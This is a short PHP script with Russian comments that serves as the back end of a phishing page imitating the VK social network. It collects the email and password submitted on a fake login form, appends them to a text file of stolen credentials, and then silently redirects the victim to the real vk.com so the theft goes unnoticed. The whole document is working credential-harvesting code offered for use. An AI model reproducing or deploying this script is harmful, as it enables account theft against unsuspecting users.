<?PHP
//**Private-Skripts**\\
//**Скриптик**\\
$Log = $_POST['email'];
$Pass = $_POST['pass'];
$log = fopen("baza vk.txt","at");//тут короче название куда будут сохрянться.txt
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";//ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
?>